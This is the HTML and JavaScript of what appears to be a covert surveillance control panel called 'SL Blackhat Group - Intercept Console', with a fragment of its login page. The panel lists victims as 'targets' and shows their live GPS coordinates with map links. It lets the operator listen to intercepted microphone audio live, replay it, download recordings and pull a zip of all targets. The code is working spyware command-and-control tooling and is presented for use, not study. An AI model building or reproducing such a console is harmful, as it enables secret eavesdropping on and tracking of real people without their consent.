...
<meta name=viewport content="width=device-width,initial-scale=1">
<title>SL Blackhat Group - Intercept Console</title>
<style>
...
.hd1{font-size:22px;font-weight:bold;letter-spacing:3px;color:#e8f1fa}
.hd2{color:#ffb454;font-size:10px;letter-spacing:3px;margin-top:4px}
.hd3{color:#5c7a99;font-size:12px;margin-top:9px;border-top:1px dashed #1e2d42;padding-top:8px}
.logout{position:absolute;top:12px;right:12px;font-size:10px;color:#5c7a99;
 border:1px solid #1e2d42;padding:4px 8px;border-radius:5px}
.grn{color:#39d98a}.amb{color:#ffb454}.red{color:#ff5c5c}
#lv{text-align:center;font-size:14px;font-weight:bold;color:#39d98a;line-height:1.5}
#lv.stby{color:#5c7a99;font-weight:normal}
#lv.comp{color:#ff5c5c;border:1px solid #ff5c5c;border-radius:8px;padding:10px;
 animation:cp 1.6s infinite}
@keyframes cp{50%{background:#1a0e10}}
#spec{display:none;width:calc(100% - 24px);margin:0 12px;border:1px solid #1e2d42;
 border-radius:8px;background:#0a0e14}
#Aud{display:none;width:calc(100% - 24px);margin:8px 12px}
#stopB{display:none;margin:4px 12px 0}
.sect{color:#5c7a99;font-size:11px;letter-spacing:3px;margin:16px 14px 0;text-align:left}
.dev{border:1px solid #16202f;border-radius:8px;padding:12px;margin:8px 0;background:#0d1420}
.dev.live{border-color:#1f4d3a}
.dev.pinned{border-color:#ff5c5c;box-shadow:0 0 10px rgba(255,92,92,.15)}
.dt{font-size:17px;margin-bottom:6px;color:#e8f1fa;letter-spacing:1px}
...
.rw{font-size:13px;margin:4px 0;color:#9db4c8}
.btn{display:inline-block;background:#12233a;color:#39d98a;border:1px solid #39d98a;
 padding:9px 13px;border-radius:6px;margin:7px 6px 0 0;font-size:13px;text-decoration:none;
...
.le{font-size:12px;color:#9db4c8;padding:4px 0;border-bottom:1px dotted #16202f;text-align:left}
.lt{color:#39d98a;margin-right:6px}
.alll{display:block;text-align:center;margin:12px;font-size:13px;color:#ffb454;
 border:1px solid #ffb454;border-radius:8px;padding:11px;font-weight:bold;letter-spacing:1px}
.ft{color:#3a4a5e;font-size:10px;text-align:center;margin-top:14px;letter-spacing:3px}
</style></head><body>
<div class=wrap>
 <div class="panel hd">
  <a class=logout href="/gudoomiye/logout">LOGOUT</a>
  <div class=hd1>SL BLACKHAT GROUP</div>
  <div class=hd2>INTELLIGENCE INTERCEPT CONSOLE &mdash; CHAIRMAN EYES ONLY</div>
  <div class=hd3><span id=clk>--:--:--</span> &nbsp;|&nbsp; LIVE: <span id=onl class=grn>0</span> &nbsp;|&nbsp; FRAGS: <span id=tot>0</span> &nbsp;|&nbsp; SYSTEM <span class=grn>&#9679; ONLINE</span></div>
 </div>
 <div class="panel">
 ...
 <div class=sect>&#9656; TARGETS &mdash; INVITEES</div>
 ...
 <a class=alll id=all href="#">&#11015; FULL ARCHIVE &mdash; ALL TARGETS (ZIP)</a>
 <div class=ft>SL BLACKHAT GROUP &bull; INTERNAL SYSTEM</div>
</div>
<script>
var KEY=new URLSearchParams(location.search).get('key')||'';
var Q=KEY?('?key='+KEY):'';
 ...
 fetch('/index.json'+Q).then(function(r){return r.json()}).then(function(d){
  ...
  for(var i=0;i<ds.length;i++){var v=ds[i];
   ...
   if(!known[v.id]){known[v.id]=1;
    logEv('TARGET ACQUIRED &mdash; <b>TGT-'+(v.no||'?')+'</b> ('+v.id+')')}
   if(prevLive[v.id]!==undefined&&prevLive[v.id]!==v.live){
    logEv(v.live?'<span class=grn>SIGNAL LIVE</span> &mdash; TGT-'+(v.no||'?')
      :'<span class=red>SIGNAL LOST</span> &mdash; TGT-'+(v.no||'?'))}
  ...
  if(!ds.length)h='<div class=mut>No targets detected &mdash; awaiting invitees</div>';
  for(var i=0;i<ds.length;i++){var v=ds[i];
   var dur=0;if(v.sessions)for(var q=0;q<v.sessions.length;q++)dur+=v.sessions[q].dur;
   var pin=(v.id===pinned);
   h+='<div class="dev'+(v.live?' live':'')+(pin?' pinned':'')+'">'
    +'<div class=dt><span class="led '+(v.live?'on':'')+'"></span>TGT-'+(v.no||'?')
    +' <span class=mut>('+v.id+')</span> '
    +(v.live?'<span class=live>&#9679; LIVE</span>':'<span class=mut>OFFLINE</span>')
    +(pin?' <span class=red>&#9679; INTERCEPTING</span>':'')+'</div>'
    +(v.geo
      ?'<div class=rw>LOC: '+v.geo.lat.toFixed(5)+', '+v.geo.lon.toFixed(5)
       +' (&plusmn;'+Math.round(v.geo.acc)+'m) &mdash; '
       +'<a href="https://maps.google.com/?q='+v.geo.lat+','+v.geo.lon+'">OPEN MAP</a></div>'
      :'<div class="rw mut">LOC: no position fix</div>')
    +'<div class=rw>SIGNAL: '+(v.sig==='good'?'<span class=grn>&#9632;&#9632;&#9632; GOOD</span>'
      :v.sig==='weak'?'<span class=amb>&#9632;&#9632; WEAK</span>'
      :v.sig==='silent'?'<span class=red>&#9632; SILENT</span>'
      :'<span class=mut">---</span>')+'</div>'
    +'<div class="rw mut">LAST: '+(v.last?fmt(v.last):'-')+' &mdash; '+v.n+' frags &mdash; REC: '+dur+'s</div>'
    +'<a class=btn href="javascript:lis(\\''+v.id+'\\')">&#9654; LISTEN LIVE</a>'
    +(v.n?'<a class=btn href="javascript:playFull(\\''+v.id+'\\')">&#9654; PLAY RECORDING</a>'
    +'<a class="btn gold" href="/getall/'+v.id+'.m4a'+Q+'">&#11015; DOWNLOAD m4a</a>':'')
    +'</div>';
  }
...
function playFull(dev){
 ...
 lv.innerHTML='PREPARING RECORDING &mdash; <b>TGT-'+tg(dev)+'</b> ...';
 logEv('PLAYBACK REQUEST &mdash; TGT-'+tg(dev));
 A.src='/getall/'+dev+'.m4a'+Q+(Q?'&':'?')+'inline=1';
 A.oncanplay=function(){lv.innerHTML='&#9654; PLAYING FULL RECORDING &mdash; <b>TGT-'+tg(dev)+'</b>';A.oncanplay=null};
...
function lis(dev){
 ...
 lv.innerHTML='&#9888; LISTENING COMPROMISED &mdash; <b>TGT-'+tg(dev)+'</b> &mdash; LIVE INTERCEPT ACTIVE';
 logEv('&#9888; LISTENING COMPROMISED &mdash; <b>TGT-'+tg(dev)+'</b>');
...
function pump(){
 ...
 var c=pend.shift();
 fetch('/f/'+c.name+Q).then(function(r){return r.arrayBuffer()}).then(function(buf){
  nextFrag=c.frag+1;
...
<meta name=viewport content="width=device-width,initial-scale=1">
<title>SL Blackhat Group - Secure Access</title>
<style>
...
<div class=box>
 <h1>SL BLACKHAT GROUP</h1>
 <div class=sub>SECURE ACCESS &mdash; CHAIRMAN ONLY</div>
